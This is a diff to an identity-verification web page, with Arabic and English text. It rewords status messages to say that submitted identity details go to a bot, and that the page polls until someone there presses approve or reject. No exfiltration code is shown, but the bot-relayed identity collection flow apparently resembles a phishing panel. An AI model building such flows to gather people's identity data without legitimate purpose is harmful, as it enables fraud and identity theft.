@@ -328,7 +328,7 @@ body{
     </svg>
     <h1>التحقق من الهوية</h1>
     <h2>Verify Your Identity</h2>
-    <p>أدخل بيانات الهوية واضغط على القبول والمتابعة لإرسال الطلب وانتظار الموافقة.</p>
+    <p>أدخل بيانات الهوية واضغط على القبول والمتابعة لإرسال الطلب إلى البوت وانتظار الموافقة.</p>
   </section>
 
   <form class="form" id="f" novalidate>
@@ -395,7 +395,7 @@ body{
   <div class="status-box" id="statusBox">
     <div id="statusIcon" style="font-size:48px">⏳</div>
     <h3 id="statusTitle">جاري انتظار الموافقة...</h3>
-    <p id="statusDesc">تم إرسال طلبك بنجاح. يرجى الانتظار لحين تأكيد الموافقة.</p>
+    <p id="statusDesc">تم إرسال طلبك إلى البوت بنجاح. يرجى الانتظار لحين الضغط على موافقة أو رفض.</p>
     <button class="retry-btn" id="retryBtn" type="button">إعادة المحاولة</button>
   </div>
 </main>
@@ -459,7 +459,7 @@ function pollDecision(requestId) {
         clearInterval(pollTimer);
         $('statusIcon').textContent = "✅";
         $('statusTitle').style.color = "var(--green)";
-        $('statusTitle').textContent = "تمت الموافقة";
+        $('statusTitle').textContent = "تم القبول";
         $('statusDesc').textContent = "تمت الموافقة على طلب التحقق بنجاح.";
         $('retryBtn').style.display = "none";
       } else if (json.status === "rejected") {
@@ -543,7 +543,7 @@ $('f').addEventListener('submit', async e => {
     $('statusIcon').textContent = "⏳";
     $('statusTitle').style.color = "var(--text)";
     $('statusTitle').textContent = "جاري انتظار الموافقة...";
-    $('statusDesc').textContent = `رقم الطلب: ${requestId} — بانتظار قرار الموافقة أو الرفض.`;
+    $('statusDesc').textContent = `رقم الطلب: ${requestId} — بانتظار الضغط على موافقة أو رفض من البوت.`;
     $('statusBox').style.display = 'block';
 
     pollDecision(requestId);
